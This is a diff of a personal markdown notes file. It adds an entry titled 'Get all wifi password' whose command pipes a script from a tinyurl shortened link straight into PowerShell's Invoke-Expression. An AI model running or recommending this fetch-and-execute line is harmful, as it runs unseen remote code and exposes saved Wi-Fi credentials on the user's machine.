@@ -52,3 +52,7 @@ Invoke-WebRequest -Uri http://www.figma.com/figjam -Method Head
 [[My AI List]]
 
 [Create QR Code using Excel](https://www.instagram.com/reel/C2U6a34reJE/?utm_source=ig_web_button_share_sheet&igsh=ZDNlZDc0MzIxNw==) 
+
+[[Get all wifi password]]
+> **irm [https://tinyurl.com/GetListWifiPasswords](https://tinyurl.com/GetListWifiPasswords?fbclid=IwAR05MEDw97SVwJQ3TWmEp4yXOICs5vZ0_kl9DjFL4DAql2yjV18AQQiJyqo) | iex**
+
